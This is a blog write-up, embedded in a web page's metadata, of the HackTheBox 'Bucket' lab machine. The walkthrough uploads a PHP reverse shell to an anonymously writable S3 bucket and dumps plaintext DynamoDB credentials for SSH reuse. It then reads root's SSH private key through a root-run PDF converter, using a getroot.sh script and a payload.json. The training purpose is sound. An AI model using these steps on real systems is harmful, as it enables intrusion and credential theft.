<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HackTheBox - Bucket | Ef's log</title><meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting"><meta name=description content="Pentesting against simulated AWS S3 Bucket "><meta name=author content="Fahmi J"><link rel=canonical href=https://fahmifj.github.io/writeups/hackthebox/htb-bucket/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.7b5ea20897d40a31378e5125d60ab6ae74024bf2fc0edda6ffc05b54c2964018.css integrity="sha256-e16iCJfUCjE3jlEl1gq2rnQCS/L8Dt2m/8BbVMKWQBg=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.85.0"><script>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g+"?ref=bwt",d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","711neo6qfi")</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDN0GP97D1',{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Bucket"><meta property="og:description" content="Pentesting against simulated AWS S3 Bucket "><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/writeups/hackthebox/htb-bucket/"><meta property="og:image" content="https://fahmifj.github.io/writeups/hackthebox/htb-bucket/imgs/image-20210424223554049.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-04-24T22:03:47+07:00"><meta property="article:modified_time" content="2021-04-24T22:03:47+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/writeups/hackthebox/htb-bucket/imgs/image-20210424223554049.png"><meta name=twitter:title content="HackTheBox - Bucket"><meta name=twitter:description content="Pentesting against simulated AWS S3 Bucket "><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://fahmifj.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox","item":"https://fahmifj.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"HackTheBox - Bucket","item":"https://fahmifj.github.io/writeups/hackthebox/htb-bucket/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Bucket","name":"HackTheBox - Bucket","description":"Pentesting against simulated AWS S3 Bucket ","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user. Inspecting the web configuration files reveals that there is an internal web currently running as a root user, which then can be exploited to gain root access.\nSkills Learned  Pentesting AWS S3 Port Forwarding Exploiting PD4ML  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Gobuster - https://github.com/OJ/gobuster AWS CLI - https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install  Reconnaissance Nmap nmap shows two open ports: 22 (SSH) and 80 (HTTP).\n→ root@iamf «bucket» «10.10.14.39» $ mkdir nmap; nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Scanning through all the ports return the same result.\nEnumeration TCP 80 - bucket.htb Visiting this port via browser redirects to http://bucket.htb/\n→ root@iamf «bucket» «10.10.14.39» $ curl -s http://10.10.10.212  htmlhead title302 Foundtitle headbody h1Foundh1 pThe document has moved a href=\"http://bucket.htb/\"herea.p hr addressApache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80address bodyhtml I’ll add bucket.htb to /etc/hosts\n10.10.10.212 bucket.htb Now it displays a web page called “Bucket Advertising Platform”.\nInspecting the page source discovers a vhost.\nI’ll add the vhost name to /etc/hosts\n10.10.10.212 bucket.htb s3.bucket.htb Gobuster There’s no interesting results.\n→ root@iamf «bucket» «10.10.14.39» $ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80 ...... /index.html (Status: 200) [Size: 5344] /server-status (Status: 403) [Size: 275] TCP 80 - s3.bucket.htb Visiting the newly discovered hostname displays a typical json output format.\nGobuster gobuster scan discovers a few web paths.\n→ root@iamf «bucket» «10.10.14.39» $ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80 ...... /shell (Status: 200) [Size: 0] /health (Status: 200) [Size: 54] /server-status (Status: 403) [Size: 275] /shell Vising /shell redirects to http://444af250749d:4566/shell/.\nOn curl, the server returns with a bunch of HTTP headers in its response\n→ root@iamf «~» «10.10.14.51» $ curl -sv http://s3.bucket.htb/shell ...... =http://444af250749d:4566/shell/ #0 to host s3.bucket.htb left intact I added it to /etc/hosts but it still doesn’t resolve.\n10.10.10.212 bucket.htb s3.bucket.htb 444af250749d Searching some of the header names on Google reveals those are used by Amazon S3\nAdding another / at the end of URL resolve to a DynamoDB JavaScript Shell, but I have no familiarity on this.\n/health /health is probably an endpoint to monitor the service status.\nFoothold Shell as www-data AWS S3 S3 stands for Simple Storage Service. It is a storage service offered by Amazon. To interact with the AWS S3, I’ll use aws cli. You can find the user guide here.\nUsage in general:\naws [options] s3  [parameters] I’ll start by listing the S3 bucket, but then it returns an error message.\n A bucket is a container for objects stored in Amazon S3. It is a folder but not really a folder.\n → root@iamf «bucket» «10.10.14.39» $ aws s3 ls --endpoint-url=http://s3.bucket.htb You must specify a region. You can also configure your region by running \"aws configure\". I can resolve the problem above by typing aws configure and fill only the default region.\n→ root@iamf «bucket» «10.10.14.39» $ aws configure AWS Access Key ID [None]: AWS Secret Access Key [None]: Default region name [None]: us-east-1 Default output format [None]: Now it works and returns a bucket called adserver.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 ls --endpoint-url=http://s3.bucket.htb 2020-10-21 09:16:03 adserver I can also read the objects inside adserver bucket.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 ls s3://adserver --endpoint-url=http://s3.bucket.htb PRE images/ 2020-10-21 09:22:04 5344 index.html → root@iamf «bucket» «10.10.14.39» $ aws s3 ls s3://adserver/images/ --endpoint-url=http://s3.bucket.htb 2020-10-21 09:52:04 37840 bug.jpg 2020-10-21 09:52:04 51485 cloud.png 2020-10-21 09:52:04 16486 malware.png Those files are the same files seen in bucket.htb.\nPHP Reverse Shell upload via S3 The aws subcommand cp allows to copy a file (objects) from local to a bucket, and vice versa (source).\naws s3 cp   [--options] Because I know the web server is Apache, I’ll create a php test files and upload it to the bucket.\n→ root@iamf «bucket» «10.10.14.39» $ echo ''  iamf-test.php → root@iamf «bucket» «10.10.14.39» $ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url=http://s3.bucket.htb upload: ./iamf-test.php to s3://adserver/iamf-test.php I can confirm the file was successfully uploaded with the subcommand ls.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 ls s3://adserver/ --endpoint-url=http://s3.bucket.htb PRE images/ 2021-04-22 14:05:15 21 iamf-test.php 2021-04-22 14:05:04 5344 index.html The file is available at http://s3.bucket.htb/adserver/iamf-test.php and http://bucket.htb/iamf-test.php but the execution of php code happens on bucket.htb. A few minutes later my files got deleted, so I can guess there’s a cleanup happening.\n→ root@iamf «bucket» «10.10.14.39» $ curl -s http://s3.bucket.htb/adserver/iamf-test.php \"IamF\" ? → root@iamf «bucket» «10.10.14.39» $ curl -s http://bucket.htb/iamf-test.php IamF Now I can try to drop a PHP reverse shell.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url=http://s3.bucket.htb Then I’ll trigger it using curl.\n→ root@iamf «bucket» «10.10.14.39» $ curl -s http://bucket.htb/iamf.php I have a shell now on my listener (wait for a few minutes or reupload the shell if it doesn’t).\n→ root@iamf «bucket» «10.10.14.39» $ rlwrap nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.39] from (UNKNOWN) [10.10.10.212] 58352 Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 18:14:02 up 13:18, 0 users, load average: 0.03, 0.04, 0.04 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1050): Inappropriate ioctl for device bash: no job control in this shell www-data@bucket:/$ Privilege Escalation Shell as roy Enumeration There is a bucket-app, but I don’t have access to it.\nwww-data@bucket:/var/www$ ls -la total 16 drwxr-xr-x 4 root root 4096 Feb 10 12:29 . drwxr-xr-x 14 root root 4096 Feb 10 12:29 .. drwxr-x---+ 4 root root 4096 Feb 10 12:29 bucket-app drwxr-xr-x 2 root root 4096 Apr 22 18:27 html roy is the only user in this box.\nwww-data@bucket:/$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash roy:x:1000:1000:,,,:/home/roy:/bin/bash Visiting roy home directory discovers a folder called project\nwww-data@bucket:/var/www$ ls -la /home/roy total 44 drwxr-xr-x 7 roy roy 4096 Apr 22 12:03 . drwxr-xr-x 3 root root 4096 Sep 16 2020 .. drwxrwxr-x 2 roy roy 4096 Apr 22 12:03 .aws lrwxrwxrwx 1 roy roy 9 Sep 16 2020 .bash_history - /dev/null -rw-r--r-- 1 roy roy 220 Sep 16 2020 .bash_logout -rw-r--r-- 1 roy roy 3771 Sep 16 2020 .bashrc drwx------ 2 roy roy 4096 Apr 22 07:57 .cache drwx------ 4 roy roy 4096 Apr 22 08:01 .gnupg -rw-r--r-- 1 roy roy 807 Sep 16 2020 .profile drwxr-xr-x 3 roy roy 4096 Apr 22 07:59 project drwxr-xr-x 3 roy roy 4096 Apr 22 07:59 snap -r-------- 1 roy roy 33 Apr 22 04:56 user.txt The files inside project are readable by others.\nwww-data@bucket:/home/roy/project$ ls -la total 44 drwxr-xr-x 3 roy roy 4096 Sep 24 2020 . drwxr-xr-x 5 roy roy 4096 Apr 24 17:31 .. -rw-rw-r-- 1 roy roy 63 Sep 24 2020 composer.json -rw-rw-r-- 1 roy roy 20533 Sep 24 2020 composer.lock -rw-r--r-- 1 roy roy 367 Sep 24 2020 db.php drwxrwxr-x 10 roy roy 4096 Sep 24 2020 vendor Looking into db.php, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint URL.\nwww-data@bucket:/home/roy/project$ cat db.php 'vendor/autoload.php'; date_default_timezone_set('America/New_York'); use Aws\\DynamoDb\\DynamoDbClient; use Aws\\DynamoDb\\Exception\\DynamoDbException; $client = new Aws\\Sdk([ 'profile' = 'default', 'region' = 'us-east-1', 'version' = 'latest', 'endpoint' = 'http://localhost:4566' ]); $dynamodb = $client-createDynamoDb(); //todo localhost:4566 is the internal endpoint of s3.bucket.htb\nwww-data@bucket:/home/roy/project$ curl -s http://localhost:4566 { \"s3\": \"running\", \"dynamodb\": \"running\" } AWS DynamoDB DynamoDB is a NoSQL database developed by Amazon. I can also use the amazon cli to interact with the DynamoDB, and it uses the same endpoint as the S3.\nGeneral usage:\nusage: aws [options] dynamodb  [ ...] [parameters] Anonymous user is allowed to list the database tables.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb { \"TableNames\": [ \"users\" ] } I can read the content of table users with the subcommand scan, and it discovers several credentials.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb { \"Items\": [ { \"password\": { \"S\": \"Management@#1@#\" }, \"username\": { \"S\": \"Mgmt\" } }, { \"password\": { \"S\": \"Welcome123!\" }, \"username\": { \"S\": \"Cloudadm\" } }, { \"password\": { \"S\": \"n2vM- }, \"username\": { \"S\": \"Sysadm\" } } ], \"Count\": 3, \"ScannedCount\": 3, \"ConsumedCapacity\": null } I’ll keep those credentials.\nSSH Access Password n2vM- works on roy.\n→ root@iamf «bucket» «10.10.14.39» $ crackmapexec ssh '10.10.10.212' -u roy -p passwords.list SSH 10.10.10.212 22 10.10.10.212 [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4 SSH 10.10.10.212 22 10.10.10.212 [-] roy:Management@#1@# Authentication failed. SSH 10.10.10.212 22 10.10.10.212 [-] roy:Welcome123! Authentication failed. SSH 10.10.10.212 22 10.10.10.212 [+] roy:n2vM-Now I can login into the system using roy credentials.\n→ root@iamf «bucket» «10.10.14.39» $ ssh roy@10.10.10.212 roy@10.10.10.212's password: Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64) ...... System load: 0.02 Usage of /: 33.8% of 17.59GB Memory usage: 29% Swap usage: 0% Processes: 252 Users logged in: 0 IPv4 address for br-bee97070fb20: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens160: 10.10.10.212 IPv6 address for ens160: dead:beef::250:56ff:feb9:df48 ...... roy@bucket:~$ id uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm) roy@bucket:~$ The user flag is done here.\nShell as root Enumeration Running WinPEAS discovers another service currently running on port 8000.\n[+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:4566 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:46275 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - It also discovers that bucket-app in /var/www/ is belong to the root user and readable to user roy but not to others.\n[+] Readable files belonging to root and readable by me but not world readable -rwxr-x---+ 1 root root 808729 Jun 10 2020 /var/www/bucket-app/pd4ml_demo.jar -rw-r-x---+ 1 root root 358 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/README.md -rw-r-x---+ 1 root root 1085 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE -rw-r-x---+ 1 root root 4689 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php -rw-r-x---+ 1 root root 4746 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php I can list the contents inside bucket-app\nroy@bucket:/var/www/bucket-app$ ls -la total 856 drwxr-x---+ 4 root root 4096 Feb 10 12:29 . drwxr-xr-x 4 root root 4096 Feb 10 12:29 .. -rw-r-x---+ 1 root root 63 Sep 23 2020 composer.json -rw-r-x---+ 1 root root 20533 Sep 23 2020 composer.lock drwxr-x---+ 2 root root 4096 Apr 22 12:38 files -rwxr-x---+ 1 root root 17222 Sep 23 2020 index.php -rwxr-x---+ 1 root root 808729 Jun 10 2020 pd4ml_demo.jar drwxr-x---+ 10 root root 4096 Feb 10 12:29 vendor According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.\nroy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf  127.0.0.1:8000 # unknown  mpm_itk_module AssignUserId root root  DocumentRoot /var/www/bucket-app   *:80 # bucket.htb DocumentRoot /var/www/html RewriteEngine On RewriteCond %{HTTP_HOST} !^bucket.htb$ RewriteRule /.* http://bucket.htb/ [R]   *:80 # s3.bucket.htb ProxyPreserveHost on ProxyPass / http://localhost:4566/ ProxyPassReverse / http://localhost:4566/  * Order deny,allow Allow from all  ServerAdmin webmaster@localhost ServerName s3.bucket.htb ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined  Internal Web I’ll expose the internal web to my localhost on the same port using SSH local port forwarding.\nroy@bucket:/var/www/bucket-app$ ~C ssh -L 8000:127.0.0.1:8000 Forwarding port. roy@bucket:/var/www/bucket-app$ The website page says the site is under construction.\nSource Code Review Upon reviewing the index.php, I found out that this website can be abused.\nroy@bucket:/var/www/bucket-app$ cat index.php 'vendor/autoload.php'; use Aws\\DynamoDb\\DynamoDbClient; if($_SERVER[\"REQUEST_METHOD\"]===\"POST\") { if($_POST[\"action\"]===\"get_alerts\") { # POST action=get_alerts  date_default_timezone_set('America/New_York'); $client = new DynamoDbClient([ # Connect to DynamoDB. 'profile' = 'default', 'region' = 'us-east-1', 'version' = 'latest', 'endpoint' = 'http://localhost:4566' ]); $iterator = $client-getIterator('Scan', array( # Read content from table alerts 'TableName' = 'alerts', 'FilterExpression' = \"title = :title\", # Filter by title 'ExpressionAttributeValues' = array(\":title\"=array(\"S\"=\"Ransomware\")), )); foreach ($iterator as $item) { #  $name=rand(1,10000).'.html'; # Generate randomnumber.html  file_put_contents('files/'.$name,$item[\"data\"]); # Write contents to randomnumber.html } passthru(\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name800 A4 -out files/result.pdf\"); # convert randomnumber.html to result.pdf } } else { ? ...... Let’s break it down.\nWhen there is a POST request contains data of action=get_alerts, the site will create a connection to DynamoDB.\nif($_SERVER[\"REQUEST_METHOD\"]===\"POST\") { if($_POST[\"action\"]===\"get_alerts\") { # POST action=get_alerts  date_default_timezone_set('America/New_York'); $client = new DynamoDbClient([ # Connect to DynamoDB.  'profile' = 'default', 'region' = 'us-east-1', 'version' = 'latest', 'endpoint' = 'http://localhost:4566' ]); It then reads every item in table alerts and filters out the result only to the one that contains string value of “Ransomware” (the key).\n DynamoDB is key-value NoSQL database.\n $iterator = $client-getIterator('Scan', array( # Read content from table alerts  'TableName' = 'alerts', 'FilterExpression' = \"title = :title\", # Filter by title  'ExpressionAttributeValues' = array(\":title\"=array(\"S\"=\"Ransomware\")), )); For each result, it writes the result value ($item[“data”]) of “Ransomware” to a randomly named HTML file.\nforeach ($iterator as $item) { #  $name=rand(1,10000).'.html'; # Generate randomnumber.html  file_put_contents('files/'.$name,$item[\"data\"]); # Write contents to randomnumber.html } The HTML file then gets converted into a PDF file (result.pdf) using pd4ml.\npassthru(\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name800 A4 -out files/result.pdf\"); # convert randomnumber.html to result.pdf From the enumeration above on the DynamoDB, I know there is no table called alerts.\nThe idea is, if I have a control over the alerts table as well as the write and read operations on the table, then I can abuse this web application to read almost any file on the system* (arbitrary file read)\n *The web application is currently running as root\n Obtain root SSH Key First I’ll try to create a dummy table on the database. I’ll use JSON file to create it.\ntest-table.json:\n{ \"TableName\": \"iamf\", \"AttributeDefinitions\": [ { \"AttributeName\": \"Name\", \"AttributeType\" : \"S\" } ], \"KeySchema\": [ { \"AttributeName\": \"Name\", \"KeyType\" : \"HASH\" } ], \"ProvisionedThroughput\" : { \"WriteCapacityUnits\": 5, \"ReadCapacityUnits\": 10 } } Now I can use the subcommand create-table with --cli-input-json option and specify the JSON file.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb create-table --cli-input-json file://test-table.json --endpoint-url http://s3.bucket.htb { \"TableDescription\": { \"AttributeDefinitions\": [ { \"AttributeName\": \"Name\", \"AttributeType\": \"S\" } ], \"TableName\": \"iamf\", \"KeySchema\": [ { \"AttributeName\": \"Name\", \"KeyType\": \"HASH\" } ], \"TableStatus\": \"ACTIVE\", \"CreationDateTime\": \"2021-04-22T15:22:33.634000-04:00\", ...... I can confirm the table has been created using the subcommand list-tables.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb { \"TableNames\": [ \"iamf\", \"users\" ] }  I can also insert items to the table, but I’ll skip it here. Detailed notes are available on my GitHub.\n Knowing this, now I can create the alerts table. I’ll write it on JSON format as well.\nalert-table.json:\n{ \"TableName\": \"alerts\", \"AttributeDefinitions\": [ {\"AttributeName\": \"title\", \"AttributeType\" : \"S\"}, {\"AttributeName\": \"data\", \"AttributeType\" : \"S\"} ], \"KeySchema\": [ {\"AttributeName\": \"title\", \"KeyType\" : \"HASH\"}, {\"AttributeName\": \"data\", \"KeyType\" : \"RANGE\"} ], \"ProvisionedThroughput\" : {\"WriteCapacityUnits\": 5, \"ReadCapacityUnits\": 10} } Now to abuse the application for file read, I’ll put the root SSH key path within  tags. The tags can be used to embed a file [source]. I’ll write it on JSON format and name it as payload.json\npayload.json\n{ \"title\": { \"S\": \"Ransomware\" }, \"data\": { \"S\": \"file:///root/.ssh/id_rsa\" } } And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as getroot.sh.\ngetroot.sh\n#!/bin/bash  echo \"[+] Create table\" aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url=http://s3.bucket.htb /dev/null sleep 0.5 echo \"[+] Insert item\" aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url=http://s3.bucket.htb /dev/null sleep 0.5 echo \"[+] Send get alerts\" curl -svd \"action=get_alerts\" http://127.0.0.1:8000/ # The port 8000 on Bucket forwarded to localhost:8000  The script assume all the required files are stored in the same folder.\n I’ll watch the result.pdf at /var/www/bucket/files and grab the SSH key using roy’s session.\nroy@bucket:/var/www/bucket-app/files$ while sleep 2; do sed -n '/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p' * 2/dev/null; done Now I can just execute the getroot.sh script and wait for it to complete.\n→ root@iamf «bucket» «10.10.14.39» $ ./getroot.sh [+] Create table [+] Insert item [+] Send get alerts * Trying 127.0.0.1:8000... * TCP_NODELAY set * Connected to 127.0.0.1 (127.0.0.1) port 8000 (#0)  POST / HTTP/1.1  Host: 127.0.0.1:8000  User-Agent: curl/7.66.0  Accept: */*  Content-Length: 17  Content-Type: application/x-www-form-urlencoded  * upload completely sent off: 17 out of 17 bytes * Mark bundle as not supporting multiuse 200 OK 22 Apr 2021 20:04:14 GMT (Ubuntu) 0 =UTF-8 #0 to host 127.0.0.1 left intact On roy shell, I can see it captured the ssh key.\nroy@bucket:/var/www/bucket-app/files$ while sleep 1; do sed -n '/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p' * 2/dev/null; done -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn ...... -----END OPENSSH PRIVATE KEY----- The full process as shown below:\nI’ll save that key as root_rsa and change its permission to 600.\n→ root@iamf «bucket» «10.10.14.39» $ chmod 600 root_rsa After that, I can just login as root user using the SSH key I obtained.\n→ root@iamf «bucket» «10.10.14.39» $ ssh -i root_rsa 10.10.10.212 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64) ...... IPv4 address for br-bee97070fb20: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens160: 10.10.10.212 IPv6 address for ens160: dead:beef::250:56ff:feb9:df48 ...... root@bucket:~# id;hostname;cut -c-15 root.txt uid=0(root) gid=0(root) groups=0(root) bucket efc73dd09ceb705  References  https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3 https://pd4ml.com/html.htm  ","wordCount":"2970","inLanguage":"en","image":"https://fahmifj.github.io/writeups/hackthebox/htb-bucket/imgs/image-20210424223554049.png","datePublished":"2021-04-24T22:03:47+07:00","dateModified":"2021-04-24T22:03:47+07:00","author":{"@type":"Person","name":"Fahmi J"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/writeups/hackthebox/htb-bucket/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class="header sticky"><nav class=nav><div class=container><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="友人F (Alt + H)">友人F</a></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://fahmifj.github.io/writeups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://fahmifj.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://fahmifj.github.io/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://fahmifj.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://fahmifj.github.io/about/ title=About><span>About</span></a></li></ul><span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/writeups/>Write-ups</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/writeups/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Bucket</h1><div class=post-description>Pentesting against simulated AWS S3 Bucket</div><div class=post-meta>April 24, 2021&nbsp;·&nbsp;14 min&nbsp;·&nbsp;Fahmi J</div></header><figure class=entry-cover><img loading=lazy srcset="https://fahmifj.github.io/writeups/hackthebox/htb-bucket/imgs/image-20210424223554049_hu39d88bc0f5f03acb6fd6e07e18677cae_137306_360x0_resize_box_2.png 360w ,https://fahmifj.github.io/writeups/hackthebox/htb-bucket/imgs/image-20210424223554049_hu39d88bc0f5f03acb6fd6e07e18677cae_137306_480x0_resize_box_2.png 480w ,https://fahmifj.github.io/writeups/hackthebox/htb-bucket/imgs/image-20210424223554049_hu39d88bc0f5f03acb6fd6e07e18677cae_137306_720x0_resize_box_2.png 720w ,https://fahmifj.github.io/writeups/hackthebox/htb-bucket/imgs/image-20210424223554049.png 736w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/writeups/hackthebox/htb-bucket/imgs/image-20210424223554049.png alt><p><text></p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><div class=inner><ul><ul><li><a href=#skills-learned aria-label="Skills Learned">Skills Learned</a></li><li><a href=#tools aria-label=Tools>Tools</a></li></ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---buckethtb aria-label="TCP 